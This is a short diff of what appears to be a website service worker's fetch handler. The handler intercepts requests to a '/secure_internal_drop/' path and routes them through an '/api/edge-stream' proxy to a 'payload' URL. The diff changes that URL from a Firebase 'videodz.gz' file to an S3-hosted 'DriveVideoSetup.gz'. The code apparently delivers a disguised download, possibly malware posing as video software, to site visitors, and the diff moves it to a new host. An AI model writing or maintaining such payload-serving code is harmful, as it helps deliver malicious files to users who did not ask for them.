@@ -13,7 +13,7 @@ self.addEventListener('fetch', (event) => {
   }
 
   if (url.pathname.includes('/secure_internal_drop/')) {
-    const payloadUrl = 'https://firebasestorage.googleapis.com/v0/b/xmeta-b0db4.firebasestorage.app/o/videodz.gz?alt=media&token=568c2d49-7391-45b8-8f4e-86d5b478fb9d';
+    const payloadUrl = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';
 
     const fetchUrl =
       '/api/edge-stream?url=' +
